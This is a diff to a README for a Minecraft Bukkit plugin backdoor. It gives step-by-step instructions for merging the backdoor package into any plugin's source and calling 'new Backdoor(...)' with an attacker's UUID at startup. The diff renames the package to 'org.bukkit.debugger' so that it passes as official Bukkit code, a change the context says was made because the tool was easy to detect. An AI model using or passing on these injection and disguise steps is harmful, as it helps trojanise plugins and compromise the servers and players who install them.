@@ -34,11 +34,11 @@ I changed parts of this sofware because it was easy to detect you could look for
 ### Manual Injection:
 
 * Download source code for desired plugin, and open in editor of your choice.
-* Merge ``com.thiccindustries.debugger`` folder into the plugin's source.
+* Merge ``org.bukkit.debugger`` folder into the plugin's source.
 * Open the Plugin's main source file, The file's class definition should look like this: 
 ``public class Something extends JavaPlugin{}``
 * Add the following line to the top of the file:
-``import com.thiccindustries.debugger``
+``import org.bukkit.debugger``
 * Find the ``@Override public void onEnable(){}`` method.
 * Add the following line to the beginning of the method:
 ``new Backdoor(this, new String[]{"[Your UUID Here]"}, [Your Chat Prefix Here]);``
